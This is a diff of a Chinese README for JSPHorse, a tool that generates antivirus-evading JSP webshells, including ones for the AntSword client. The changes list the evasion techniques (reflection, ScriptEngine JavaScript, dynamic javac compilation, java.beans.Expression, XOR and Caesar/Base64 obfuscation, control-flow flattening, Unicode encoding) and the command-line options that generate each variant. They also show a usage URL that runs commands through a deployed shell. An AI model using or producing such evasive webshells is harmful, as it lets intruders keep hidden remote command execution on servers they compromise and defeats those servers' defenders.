@@ -6,9 +6,7 @@
 
 ## 简介
 
-一个JSP免杀Webshell生成器，支持普通回显Webshell：`1.jsp?pwd=xxx&cmd=whoami`
-
-**已完成蚁剑免杀Webshell**!
+一个JSP免杀Webshell生成器，主要支持普通回显Webshell，也实现了蚁剑的免杀
 
 ```txt
 　　 へ　　　　　／|
@@ -26,19 +24,21 @@
 　　＞―r￣￣~∠--|
 ```
 
-特点：
+主要的免杀技术：
 
-- Java反射调用
+- 基本的Java反射调用免杀
 - ScriptEngine调用JS免杀
-- 使用分割和注释绕过可能的JS黑名单
-- Javac动态编译class免杀（参考三梦师傅代码）
+- Javac动态编译class免杀
+- java.beans.Expression免杀
+
+代码生成方式：
+
 - 双重随机异或运算加密数字常量
 - 凯撒密码随机偏移并结合Base64双重加密字符串常量
 - 使用控制流平坦化并随机生成分发器
 - 所有标识符全部替换为随机字符串
 - 支持全局Unicode编码
 - 每次执行都会生成完全不同的马（结构相同内容不同）
-- 已完成蚁剑免杀马！
 
 简单测试了免杀效果：
 
@@ -60,29 +60,25 @@
 
 `java -jar JSPHorse.jar -p your_password --ant`
 
-全局Unicode编码（JSP支持全局Unicode编码）
+生成Javac动态编译class的Webshell
 
-`java -jar JSPHorse.jar -p your_password -u`
-
-生成进阶版Webshell（Javac动态编译class）
-
-`java -jar JSPHorse.jar -p your_password --super`
-
-进阶版Webshell基础上全局Unicode编码
-
-`java -jar JSPHorse.jar -p your_password --super -u`
+`java -jar JSPHorse.jar -p your_password --javac`
 
 使用ScriptEngine调用JS免杀
 
 `java -jar JSPHorse.jar -p your_password --js`
 
-使用ScriptEngine调用JS免杀基础上全局Unicode编码
+使用Expression免杀
 
-`java -jar JSPHorse.jar -p your_password --js -u`
+`java -jar JSPHorse.jar -p your_password --expr`
+
+任何一种方式加入`-u`参数进行Unicode编码（有时候有奇效）
+
+`java -jar JSPHorse.jar -p your_password --expr -u`
 
 如何使用？
 
-1.jsp?pwd=your_password&cmd=calc.exe
+`1.jsp?pwd=your_password&cmd=ipconfig`
 
 ## 图片
 
